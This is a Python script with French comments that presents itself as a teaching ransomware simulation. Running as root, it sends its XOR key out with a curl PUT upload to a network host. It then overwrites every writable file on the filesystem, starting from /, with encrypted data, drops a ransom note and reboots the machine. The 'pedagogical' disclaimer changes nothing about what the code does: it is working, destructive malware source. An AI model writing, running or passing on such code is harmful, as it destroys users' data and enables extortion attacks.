#!/usr/bin/env python3
# AVERTISSEMENT : Script pédagogique uniquement. Ne pas exécuter sur une machine réelle.

import os
import sys
import base64
import socket
import logging
import subprocess

KEY_FILE = "/tmp/ransom_key.txt"
RANSOM_NOTE = "/root/README.txt"
LOG_FILE = "/tmp/ransomware.log"
REMOTE_UPLOAD_URL = "http://192.168.45.100/upload/key.txt"
XOR_KEY = 0xAA  # Clé simple pour chiffrer (à usage pédagogique)

logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def generate_key():
    key = XOR_KEY.to_bytes(1, 'big')  # Clé codée sur 1 octet pour XOR
    with open(KEY_FILE, "wb") as f:
        f.write(base64.b64encode(key))
    logging.info("Clé générée.")
    return XOR_KEY

def exfiltrate_key():
    try:
        subprocess.run([
            "curl", "-X", "PUT", "--upload-file", KEY_FILE, REMOTE_UPLOAD_URL
        ], check=True)
        os.remove(KEY_FILE)
        logging.info("Clé exfiltrée avec curl.")
    except Exception as e:
        logging.error(f"Erreur d'exfiltration : {e}")
        sys.exit("Échec critique de l'exfiltration.")

def xor_encrypt(data, key):
    return bytes([b ^ key for b in data])

def encrypt_file(path, key):
    try:
        with open(path, "rb") as f:
            data = f.read()
        encrypted = xor_encrypt(data, key)
        encoded = base64.b64encode(encrypted)
        with open(path, "wb") as f:
            f.write(encoded)
        logging.info(f"Fichier chiffré : {path}")
    except Exception as e:
        logging.warning(f"Erreur sur {path} : {e}")

def encrypt_system(key):
    logging.info("Démarrage du chiffrement...")
    for root, dirs, files in os.walk("/", topdown=True):
        for name in files:
            path = os.path.join(root, name)
            if os.path.isfile(path) and os.access(path, os.W_OK):
                encrypt_file(path, key)

def create_ransom_note():
    try:
        with open(RANSOM_NOTE, "w") as f:
            f.write(
                "----- VOS FICHIERS ONT ÉTÉ CHIFFRÉS -----\\n"
                "Ceci est une simulation pédagogique.\\n"
                "Aucune rançon réelle ne sera demandée.\\n"
                "Contactez votre formateur pour la suite.\\n"
            )
        logging.info("Message de rançon créé.")
    except Exception as e:
        logging.warning(f"Erreur lors de la note de rançon : {e}")

def reboot():
    logging.info("Redémarrage dans 5 secondes...")
    subprocess.run(["sleep", "5"])
    subprocess.run(["reboot"])

def main():
    if os.geteuid() != 0:
        sys.exit("Ce script doit être exécuté en root.")
    key = generate_key()
    exfiltrate_key()
    encrypt_system(key)
    create_ransom_note()
    reboot()

if __name__ == "__main__":
    main()

